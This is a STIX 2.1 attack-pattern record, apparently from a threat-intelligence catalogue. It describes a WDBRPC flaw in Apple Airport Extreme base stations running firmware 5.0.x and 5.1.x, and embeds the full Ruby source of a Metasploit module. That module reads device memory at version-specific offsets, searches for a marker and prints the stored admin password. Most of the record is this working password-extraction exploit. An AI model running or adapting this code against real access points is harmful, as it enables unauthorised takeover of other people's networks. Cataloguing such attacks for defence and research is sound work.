{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c97bb26b-7db3-4d6f-ae98-5641083b62fb",
    "created": "2024-08-14T16:22:34.942792Z",
    "modified": "2024-08-14T16:22:34.942796Z",
    "name": "Apple Airport Extreme Password Extraction (WDBRPC)",
    "description": " This module can be used to read the stored password of a vulnerable Apple Airport Extreme access point. Only a small number of firmware versions have the WDBRPC service running, however the factory configuration was vulnerable. It appears that firmware versions 5.0.x as well as 5.1.x are susceptible to this issue. Once the password is obtained, the access point can be managed using the Apple AirPort utility. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vxworks/apple_airport_extreme_password.rb",
            "external_id": "apple_airport_extreme_password.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WDBRPC_Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple Airport Extreme Password Extraction (WDBRPC)',\n      'Description'    => %q{\n        This module can be used to read the stored password of a vulnerable\n      Apple Airport Extreme access point. Only a small number of firmware versions\n      have the WDBRPC service running, however the factory configuration was\n      vulnerable. It appears that firmware versions 5.0.x as well as 5.1.x are\n      susceptible to this issue. Once the password is obtained, the access point\n      can be managed using the Apple AirPort utility.\n      },\n      'Author'         => [ 'hdm'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '66842'],\n          ['URL', 'https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/'],\n          ['US-CERT-VU', '362332']\n        ]\n      ))\n  end\n\n  def run\n    target  = nil\n    targets = {\n      \"Apple Base Station V5.0.4\" => {\n        :version  => 0x0024ee3c,\n        :password => 0x00380000,\n        :password_search => 32768,\n      },\n      \"Apple Base Station V5.0.3\" => {\n        :version  => 0x0024e24c,\n        :password => 0x00380000,\n        :password_search => 32768,\n      },\n      \"Apple Base Station V5.0.1\" => {\n        :version  => 0x0024b45c,\n        :password => 0x00fa7500,\n        :password_search => 16384\n      }\n    }\n\n\n    wdbrpc_client_connect\n\n    if not @wdbrpc_info[:rt_vers]\n      print_error(\"No response to connection request\")\n      return\n    end\n\n    membase = @wdbrpc_info[:rt_membase]\n    found   = false\n\n    targets.each_pair do |tname,target|\n\n      vers = wdbrpc_client_memread(membase + target[:version], 32).unpack(\"Z*\")[0]\n\n      if not (vers and vers.length > 0 and vers == tname)\n        next\n      end\n\n      found = true\n\n      base = membase + target[:password]\n      off  = 0\n      mtu  = @wdbrpc_info[:agent_mtu] - 80\n      pass = nil\n\n      while off < target[:password_search]\n        buff = wdbrpc_client_memread(base + off, mtu)\n        pidx = buff.index(\"WPys\")\n\n        if pidx\n          plen = buff[pidx + 8, 4].unpack(\"V\")[0]\n          pass = buff[pidx + 12, plen].unpack(\"Z*\")[0]\n          break\n        end\n\n        off += buff.length\n      end\n\n      if pass\n        print_good(\"Password for this access point is '#{pass}'\")\n      else\n        print_error(\"The password could not be located\")\n      end\n      break\n    end\n\n    if not found\n      print_error(\"No matching fingerprint for this access point\")\n    end\n\n    wdbrpc_client_disconnect\n  end\nend\n"
}